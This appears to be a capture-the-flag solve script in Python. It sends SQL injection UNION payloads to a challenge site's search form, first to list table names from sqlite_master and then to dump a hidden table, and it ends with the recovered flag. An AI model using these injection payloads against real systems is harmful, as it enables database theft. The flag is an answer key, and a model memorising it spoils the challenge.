import requests as req


url = "https://challenges.isictf.live:1410/search"

resp = req.post(url, data={
    "search":"fref%' UNION SELECT 1,* FROM pphovqxgexkavjiecxqnlqxstwuxfa --"
})

print(resp.text)
# #to get the name of the table
# # result = search_for_product("fref%' UNION SELECT 1,name,50 FROM sqlite_master WHERE type='table' AND name!='products' --")
# #table name:pphovqxgexkavjiecxqnlqxstwuxfa
# #to get the flag:
# # result2 = search_for_product("fref%' UNION SELECT 1,* FROM pphovqxgexkavjiecxqnlqxstwuxfa --")
# print(resp.json())

#ISICTF{343_sql_1nj3ct10n_b345t}